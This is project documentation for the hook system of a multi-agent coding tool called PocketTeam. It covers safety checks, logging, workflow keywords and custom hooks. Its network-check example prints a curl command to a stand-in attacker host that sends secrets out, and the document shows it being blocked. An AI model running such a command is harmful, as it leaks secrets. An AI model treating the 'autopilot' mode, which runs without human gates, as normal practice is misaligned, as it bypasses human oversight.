# Hooks System Documentation

PocketTeam uses a **hook system** to enforce safety, detect workflows, and integrate with external systems. Hooks are runtime scripts that execute at specific events and survive context compaction.

## Overview

Hooks are configured in `.claude/settings.json` and run automatically at key points:

```json
{
  "hooks": {
    "PreToolUse": [...],
    "PostToolUse": [...],
    "UserPromptSubmit": [...],
    "SubagentStart": [...],
    "SubagentStop": [...],
    "SessionStart": [...],
    "PreCompact": [...]
  }
}
```

Each hook is a Python script that:
- Receives input data
- Performs validation or logging
- Returns output (context injection, configuration, etc.)
- Executes in < 500ms

## Hook Types

### PreToolUse

**When**: Before any tool is called (Read, Write, Bash, etc.)

**Purpose**: Validate and prevent dangerous operations

**Files**:
- `pocketteam/safety/` — Safety validation
  - `network_rules.py` — Domain allowlist checks
  - `sensitive_paths.py` — Protect .env, .aws, .ssh
  - `guardian.py` — Main orchestrator
- `pocketteam/hooks/delegation_enforcer.py` — Agent permission checks

**Example: Network Check**

```python
# pocketteam/safety/network_rules.py
def validate_domain(url: str) -> bool:
    """Check if domain is in approved list."""
    approved = ["github.com", "api.github.com", "pypi.org", ...]
    domain = extract_domain(url)
    return domain in approved or domain in config.network.approved_domains
```

When an agent tries to call an unapproved API:

```bash
# This fails:
curl https://evil.com/steal-secrets

# Error:
Error: domain "evil.com" not in approved_domains
Kill switch activated.
```

**Configuration**:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|Write|Edit|Read|Glob|Grep|mcp__.*",
        "hooks": [
          {
            "type": "command",
            "command": "cd /path && PYTHONPATH=. python -m pocketteam.safety pre"
          }
        ]
      }
    ]
  }
}
```

### PostToolUse

**When**: After a tool call succeeds or fails

**Purpose**: Log actions, redact secrets, update event stream

**Files**:
- `pocketteam/safety/guardian.py` — Post-tool logging
- `pocketteam/hooks/agent_lifecycle.py` — Event recording

**Example: Redaction**

```python
# Output from tool is redacted automatically
Tool output: "API_KEY=sk-ant-v..."
Redacted: "API_KEY=[REDACTED]"
```

**Configuration**:

```json
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Bash|Write|Edit",
        "hooks": [
          {
            "type": "command",
            "command": "cd /path && PYTHONPATH=. python -m pocketteam.safety post"
          }
        ]
      }
    ]
  }
}
```

### UserPromptSubmit

**When**: User sends a message (via Claude Code, Telegram, etc.)

**Purpose**: Detect workflow keywords, persist Telegram messages

**Files**:
- `pocketteam/hooks/keyword_detector.py` — Workflow mode detection
- `pocketteam/hooks/telegram_inbox.py` — Message persistence

**Workflow Keywords**:

```
autopilot: <task>      # Full autonomous pipeline (plan → implement → test → deploy)
ralph: <task>          # Persistent mode: fix loop until ALL tests pass
quick: <task>          # Speed mode: skip reviews, implement directly
deep-dive: <topic>     # Spawn 3 parallel research agents
```

**Example: autopilot Mode**

```
User sends:
  autopilot: implement authentication

Hook detects:
  - Mode: autopilot
  - Task: "implement authentication"

Injects:
  "AUTOPILOT: Full pipeline without human gates.
   Planner→Reviewer→Engineer→QA→Reviewer→Security→Docs.
   Stop only on failure, retry up to 3x."
```

**Configuration**:

```json
{
  "hooks": {
    "UserPromptSubmit": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "cd /path && PYTHONPATH=. python -m pocketteam.hooks keyword"
          },
          {
            "type": "command",
            "command": "cd /path && PYTHONPATH=. python -m pocketteam.hooks telegram_save"
          }
        ]
      }
    ]
  }
}
```

### SubagentStart

**When**: An agent (subagent) is spawned

**Purpose**: Log agent startup, record event

**Files**:
- `pocketteam/hooks/agent_lifecycle.py` — Agent tracking

**Event Written**:

```json
{
  "ts": "2026-03-26T10:15:00Z",
  "agent": "engineer",
  "type": "spawn",
  "status": "started",
  "action": "Implementing feature X",
  "agent_id": "abc-123",
  "model": "claude-sonnet-4-6"
}
```

**Configuration**:

```json
{
  "hooks": {
    "SubagentStart": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "cd /path && PYTHONPATH=. python -m pocketteam.hooks agent_start"
          }
        ]
      }
    ]
  }
}
```

### SubagentStop

**When**: An agent finishes or fails

**Purpose**: Log completion, record tool count and duration

**Files**:
- `pocketteam/hooks/agent_lifecycle.py` — Completion tracking

**Event Written**:

```json
{
  "ts": "2026-03-26T10:15:10Z",
  "agent": "engineer",
  "type": "complete",
  "status": "done",
  "action": "Finished (8 tool calls, 10s)",
  "agent_id": "abc-123"
}
```

**Configuration**:

```json
{
  "hooks": {
    "SubagentStop": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "cd /path && PYTHONPATH=. python -m pocketteam.hooks agent_stop"
          }
        ]
      }
    ]
  }
}
```

### SessionStart

**When**: A new Claude Code session starts

**Purpose**: Load unread Telegram messages, display inbox

**Files**:
- `pocketteam/hooks/session_start.py` — Inbox recovery

**Example Output**:

```
📨 3 unread Telegram message(s) from CEO:

  [09:15] "implement the dashboard"
  [09:32] "add Telegram support"
  [10:00] "reicht"

Review and respond to these messages.
```

**Use Case**: After a session crashes, COO sees all pending tasks on restart.

**Configuration**:

```json
{
  "hooks": {
    "SessionStart": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "cd /path && PYTHONPATH=. python -m pocketteam.hooks session_start"
          }
        ]
      }
    ]
  }
}
```

### PreCompact

**When**: Context is about to be compacted (before conversation history is truncated)

**Purpose**: Preserve critical state before compaction

**Files**:
- `pocketteam/hooks/pre_compact.py` — State persistence

**What It Saves**:

- Current task progress
- Pending TODOs
- Critical decisions
- Budget remaining
- Session state
- Last-known COO status

**Use Case**: When Claude Code compacts the context (after 100k tokens), the hook saves state to `.pocketteam/sessions/` so the COO can resume without losing progress.

**Configuration**:

```json
{
  "hooks": {
    "PreCompact": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "cd /path && PYTHONPATH=. python -m pocketteam.hooks pre_compact"
          }
        ]
      }
    ]
  }
}
```

## Hook Configuration

Hooks are defined in `.claude/settings.json`:

```json
{
  "hooks": {
    "<HookType>": [
      {
        "matcher": "Tool1|Tool2|...",  // Regex of tools to match
        "hooks": [
          {
            "type": "command",         // Only "command" is supported
            "command": "python -m ..."  // Full bash command to run
          }
        ]
      }
    ]
  }
}
```

### Matcher

The `matcher` field is a regex pattern:

```json
"matcher": "Bash|Write|Edit"  // Matches Bash, Write, or Edit tools

"matcher": "mcp__.*"          // Matches MCP tools (mcp__tool_name)

"matcher": ""                 // Matches all (for UserPromptSubmit, SessionStart, etc.)
```

### Return Values

Hooks return a dict with optional fields:

```python
def handle(hook_input: dict) -> dict:
    return {
        "additionalContext": "String to inject into prompt",
        "block": True,           # Block the operation (for safety)
        "blockReason": "Why",    # Reason for blocking
        "metadata": {...},       # Arbitrary metadata
    }
```

**Important**: Hooks CANNOT modify the tool call itself. They can only:
- Block the call (safety)
- Inject context
- Record metadata

## Event Stream

All critical events are written to `.pocketteam/events/stream.jsonl`:

```json
{"ts": "2026-03-26T10:15:00Z", "agent": "engineer", "type": "spawn", ...}
{"ts": "2026-03-26T10:15:05Z", "agent": "engineer", "type": "tool_use", ...}
{"ts": "2026-03-26T10:15:10Z", "agent": "engineer", "type": "complete", ...}
```

**Event types**:
- `spawn` — Agent started
- `tool_use` — Tool executed
- `complete` — Agent finished
- `error` — Error occurred

The dashboard reads this in real-time for live updates.

## Workflow Keywords

### autopilot: <task>

Runs a full autonomous pipeline without human gates:

1. **Planner** — Create implementation plan
2. **Reviewer** — Review the plan
3. **Engineer** — Implement the plan
4. **QA** — Test the implementation
5. **Reviewer** — Review the code
6. **Security** — Audit for security issues
7. **Documentation** — Update docs
8. Repeat steps 3-7 if tests fail (max 3 retries)
9. **Done** — No human approval needed

**Use when**: You want fully autonomous execution (no delays)

**Risks**: Mistakes may reach production without review

### ralph: <task>

Persistent implementation mode with automatic fix loops:

1. **Engineer** implements
2. **QA** tests
3. If tests fail:
   - **Engineer** fixes the issue
   - **QA** tests again
   - Repeat until all tests pass (max 5 iterations)
4. When all tests pass → move to review phase

**Use when**: You have a complex feature with many edge cases and want guaranteed test coverage

**Advantages**: Stays on the same feature until it's perfect

### quick: <task>

Skip planning and reviews, implement directly:

1. **Engineer** implements (Sonnet, but upgrades to Opus if complex)
2. **QA** quick smoke test
3. **Done** (no review or security audit)

**Use when**: Fixing a simple bug or making a minor change

**Risks**: No security audit or code review

### deep-dive: <topic>

Spawn 3 parallel research agents:

1. **Agent 1** researches the topic in the codebase
2. **Agent 2** searches external documentation
3. **Agent 3** analyzes edge cases and requirements
4. **COO** synthesizes findings into a comprehensive report

**Use when**: You need thorough research before starting implementation

**Example**:
```
deep-dive: how do we implement real-time collaboration?
```

## Safety Integration

Hooks enforce PocketTeam's 9-layer safety system:

1. **PreToolUse** — Network allowlist, sensitive path protection
2. **PostToolUse** — Output redaction, event logging
3. **UserPromptSubmit** — Workflow keyword validation
4. **SubagentStart/Stop** — Agent lifecycle tracking
5. **D-SAC pattern** — Approval tokens for destructive ops
6. **Budget limits** — Per-agent and per-task caps
7. **Rate limits** — Max turns per agent
8. **Network isolation** — Approved domains only
9. **Secrets protection** — .env, .aws, .ssh protected

## Writing Custom Hooks

### Example: Custom Slack Notification Hook

Create `pocketteam/hooks/slack_notify.py`:

```python
"""Send Slack notification when agent completes."""

import os
import requests
from datetime import datetime


def handle(hook_input: dict) -> dict:
    """Send Slack message on agent completion."""
    agent_type = hook_input.get("agent_type", "unknown")
    duration_ms = hook_input.get("duration_ms", 0)
    stop_reason = hook_input.get("stop_reason", "unknown")

    slack_webhook = os.environ.get("SLACK_WEBHOOK_URL")
    if not slack_webhook:
        return {}

    message = {
        "text": f":checkmark: Agent *{agent_type}* completed",
        "blocks": [
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": f"Agent: *{agent_type}*\nDuration: {duration_ms / 1000:.1f}s\nStatus: {stop_reason}"
                }
            }
        ]
    }

    try:
        requests.post(slack_webhook, json=message, timeout=5)
    except Exception as e:
        print(f"Slack notification failed: {e}")

    return {}
```

Register in `.claude/settings.json`:

```json
{
  "hooks": {
    "SubagentStop": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "cd /path && PYTHONPATH=. python -m pocketteam.hooks slack_notify"
          }
        ]
      }
    ]
  }
}
```

Set the webhook URL:

```bash
export SLACK_WEBHOOK_URL=https://hooks.slack.com/services/...
```

### Example: Custom Budget Hook

Extend budget enforcement with custom rules:

```python
"""Custom budget enforcement based on time of day."""

from datetime import datetime
import os


def handle(hook_input: dict) -> dict:
    """Allow higher budget during business hours."""
    agent_type = hook_input.get("agent_type", "")

    hour = datetime.now().hour
    is_business_hours = 9 <= hour < 17

    # Higher budget during business hours
    max_budget = 10.0 if is_business_hours else 2.0

    return {
        "additionalContext": f"Budget for {agent_type} this hour: ${max_budget:.2f}"
    }
```

## Troubleshooting Hooks

### Hook doesn't execute

1. **Check the hook is registered** in `.claude/settings.json`
2. **Check the matcher**:
   - Is it matching the tool you're calling?
   - Test with empty matcher: `"matcher": ""`
3. **Check the command**:
   - Can you run it manually? `cd /path && python -m pocketteam.hooks ...`
4. **Check PYTHONPATH**:
   - Is `PYTHONPATH=.` set before the command?
5. **Check logs**:
   ```bash
   # Enable debug
   export LOGLEVEL=DEBUG
   pocketteam agent run --task "..."
   ```

### Hook times out

1. **Hooks must complete in < 500ms**
2. **Avoid blocking operations** (network calls, file I/O)
3. **Use async if possible** (future enhancement)

### Hook blocks a valid operation

1. **Check the blocking condition** in the hook code
2. **Whitelist the domain** (if network):
   ```bash
   pocketteam config set network.approved_domains '["domain.com"]'
   ```
3. **Temporarily disable hook** (testing only):
   - Comment out the hook in `.claude/settings.json`
   - Restart Claude Code

## See Also

- [CONFIGURATION.md](CONFIGURATION.md) — Hook-related config options
- [README.md](../README.md) — 9-layer safety system overview
- [CONTRIBUTING.md](../CONTRIBUTING.md) — How to add custom hooks
